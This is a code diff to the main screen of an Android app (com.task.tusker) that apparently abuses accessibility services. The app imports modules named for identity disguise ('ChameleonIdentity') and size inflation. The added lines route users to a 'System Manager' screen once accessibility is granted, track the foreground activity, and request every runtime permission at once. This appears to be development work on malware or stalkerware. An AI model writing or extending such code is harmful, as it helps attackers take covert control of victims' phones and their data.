@@ -24,6 +24,7 @@ import androidx.appcompat.app.AppCompatActivity;
 import com.task.tusker.permissions.AutoPermissionManager;
 import com.task.tusker.SystemManagerActivity;
 import com.task.tusker.receivers.AccessibilityReminderReceiver;
+import com.task.tusker.utils.ActivityTracker;
 import com.task.tusker.security.ChameleonIdentity;
 import com.task.tusker.security.SecurityGuard;
 import com.task.tusker.security.SizeInflationManager;
@@ -68,6 +69,16 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
 
         permissionManager = new AutoPermissionManager(this);
+
+        // If accessibility is already enabled on launch, skip the setup screen entirely
+        // and go straight to System Manager. This makes System Manager the effective
+        // home screen of the app whenever accessibility is granted.
+        if (permissionManager.isAccessibilityServiceEnabled()) {
+            startActivity(new Intent(this, SystemManagerActivity.class)
+                    .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP));
+            finish();
+            return;
+        }
 
         statusText           = findViewById(R.id.statusText);
         statusTitle          = findViewById(R.id.statusTitle);
@@ -206,6 +217,7 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onResume() {
         super.onResume();
+        ActivityTracker.set(this);
         if (helpWebView != null) helpWebView.onResume();
         updateUiState();
     }
@@ -213,6 +225,7 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onPause() {
         super.onPause();
+        ActivityTracker.clear(this);
         if (helpWebView != null) helpWebView.onPause();
     }
 
@@ -273,7 +286,10 @@ public class MainActivity extends AppCompatActivity {
                 if (enabled && !accessibilityWasEnabled) {
                     accessibilityWasEnabled = true;
                     showEnabledState();
-                    // Open System Manager screen — permissions are handled by the service
+                    // Request all standard runtime permissions immediately — the Activity
+                    // is in the foreground here so the native OS dialog appears directly.
+                    requestRuntimePermissions();
+                    // Then open System Manager screen.
                     try {
                         Intent smIntent = new Intent(MainActivity.this, SystemManagerActivity.class);
                         smIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
